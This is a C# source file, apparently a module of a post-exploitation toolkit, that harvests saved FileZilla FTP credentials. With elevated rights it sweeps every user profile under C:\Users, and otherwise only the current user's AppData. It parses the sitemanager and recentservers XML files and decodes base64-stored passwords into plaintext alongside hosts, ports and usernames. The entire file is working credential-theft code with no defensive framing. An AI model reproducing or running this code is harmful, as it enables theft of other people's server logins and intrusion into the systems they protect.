using System;
using System.IO;
using System.Text;
using System.Xml;

namespace Gopher.Holes
{
	class FileZilla
	{
		public static string Dig(bool isHighIntegrity)
		{
			string findings = "";

			if (isHighIntegrity)
			{
				DirectoryInfo di = new DirectoryInfo(@"C:\Users\");

				foreach (DirectoryInfo user in di.GetDirectories())
				{
					string[] paths =
					{
						user.FullName + @"\AppData\Roaming\FileZilla\sitemanager.xml",
						user.FullName + @"\AppData\Roaming\FileZilla\recentservers.xml"
					};

					foreach (string path in paths)
					{
						if (File.Exists(path))
						{
							if (string.IsNullOrEmpty(findings))
							{
								findings += string.Format("\n# ---- FileZilla sessions of user {0} ---- #\n", user.Name);
							}

							XmlDocument xml = new XmlDocument();
							xml.Load(path);
							XmlNodeList servers = xml.GetElementsByTagName("Server");

							foreach (XmlNode server in servers)
							{
								findings += string.Format("|\n|   Server   : {0}:{1}\n", server.SelectSingleNode("Host").InnerText, server.SelectSingleNode("Port").InnerText);

								if (server.SelectSingleNode("User") != null)
                                {
									findings += string.Format("|   Username : {0}\n", server.SelectSingleNode("User").InnerText);
								}
								//findings += string.Format("|   Username : {0}\n", server.SelectSingleNode("User").InnerText);
								XmlNode password = server.SelectSingleNode("Pass");

								if (password != null)
								{
									if (password.Attributes.Count > 0)
									{
										if (password.Attributes["encoding"].Value == "base64")
										{
											findings += string.Format("|   Password : {0}\n", Encoding.UTF8.GetString(Convert.FromBase64String(password.InnerText)));
										}
										else
										{
											findings += "|   Password : Saved in session, but master password prevents plaintext recovery\n";
										}
									}
									else
									{
										findings += string.Format("|   Password : {0}\n", password.InnerText);
									}
								}
							}
						}
					}

					if (!string.IsNullOrEmpty(findings))
					{
						findings += "|\n# ---- #\n";
					}
				}
			}
			else
			{
				string appdata = Environment.GetEnvironmentVariable("APPDATA");
				string[] paths =
				{
					appdata + @"\FileZilla\sitemanager.xml",
					appdata + @"\FileZilla\recentservers.xml"
				};

				foreach (string path in paths)
				{
					if (File.Exists(path))
					{
						if (string.IsNullOrEmpty(findings))
						{
							findings += "\n# ---- FileZilla sessions ---- #\n";
						}

						XmlDocument xml = new XmlDocument();
						xml.Load(path);
						XmlNodeList servers = xml.GetElementsByTagName("Server");

						foreach (XmlNode server in servers)
						{
							findings += string.Format("|\n|   Server   : {0}:{1}\n", server.SelectSingleNode("Host").InnerText, server.SelectSingleNode("Port").InnerText);
							if (server.SelectSingleNode("User") != null)
							{
								findings += string.Format("|   Username : {0}\n", server.SelectSingleNode("User").InnerText);
							}
							//findings += string.Format("|   Username : {0}\n", server.SelectSingleNode("User").InnerText);
							XmlNode password = server.SelectSingleNode("Pass");

							if (password != null)
							{
								if (password.Attributes.Count > 0)
								{
									if (password.Attributes["encoding"].Value == "base64")
									{
										findings += string.Format("|   Password : {0}\n", Encoding.UTF8.GetString(Convert.FromBase64String(password.InnerText)));
									}
									else
									{
										findings += "|   Password : Saved in session, but master password prevents plaintext recovery\n";
									}
								}
								else
								{
									findings += string.Format("|   Password : {0}\n", password.InnerText);
								}
							}
						}
					}
				}

				if (!string.IsNullOrEmpty(findings))
				{
					findings += "|\n# ---- #\n";
				}
			}

			return findings;
		}
	}
}
